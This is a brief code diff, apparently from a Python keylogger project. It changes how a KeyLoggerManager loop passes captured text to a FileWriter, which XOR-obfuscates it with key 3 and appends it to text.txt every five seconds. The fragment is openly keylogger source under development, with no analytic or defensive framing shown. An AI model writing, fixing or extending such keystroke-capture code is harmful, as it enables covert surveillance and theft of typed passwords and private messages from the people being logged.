@@ -99,7 +99,7 @@ class FileWriter(IWriter):
     def send_data(self, data:str , machine_name: str):
             text = ''
             for i in data:
-                text += self.Encryption.encryption_using_xor(i)
+                text += self.Encryption.encryption_using_xor(i,3)
             with open('text.txt','a') as file:
                         file.write(text)
 
@@ -120,7 +120,7 @@ class KeyLoggerManager(FileWriter,KeyLoggerService):
             self.start_logging()
             self.Encryption = Encryptor()
             while True:
-                    writing_to_a_file.send_data(self.text,'l')
+                    writing_to_a_file.send_data(str(self.text),'l')
                     start_time = str(datetime.now())
                     time.sleep(5)
                     
